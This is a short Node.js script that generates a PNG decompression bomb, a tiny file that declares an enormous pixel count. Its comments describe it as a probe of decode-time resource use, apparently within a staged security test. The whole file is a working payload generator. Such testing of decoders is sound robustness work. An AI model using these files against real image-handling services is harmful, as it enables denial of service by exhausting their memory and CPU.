// Phase 6: generates a highly compressible PNG (small file, huge pixel count)
// to probe decode-time resource use. Usage: node make-bomb.mjs <WxH> <out>
import { deflateSync, crc32 } from "node:zlib";
import { writeFileSync } from "node:fs";
const [W, H] = process.argv[2].split("x").map(Number);
const out = process.argv[3];
const chunk = (type, data) => {
  const len = Buffer.alloc(4); len.writeUInt32BE(data.length);
  const td = Buffer.concat([Buffer.from(type), data]);
  const crc = Buffer.alloc(4); crc.writeUInt32BE(crc32(td) >>> 0);
  return Buffer.concat([len, td, crc]);
};
const ihdr = Buffer.alloc(13); ihdr.writeUInt32BE(W, 0); ihdr.writeUInt32BE(H, 4); ihdr[8] = 8; ihdr[9] = 2;
const row = Buffer.alloc(1 + W * 3);
const rows = Buffer.concat(Array(H).fill(row));
writeFileSync(out, Buffer.concat([Buffer.from([0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a]), chunk("IHDR", ihdr), chunk("IDAT", deflateSync(rows, { level: 9 })), chunk("IEND", Buffer.alloc(0))]));
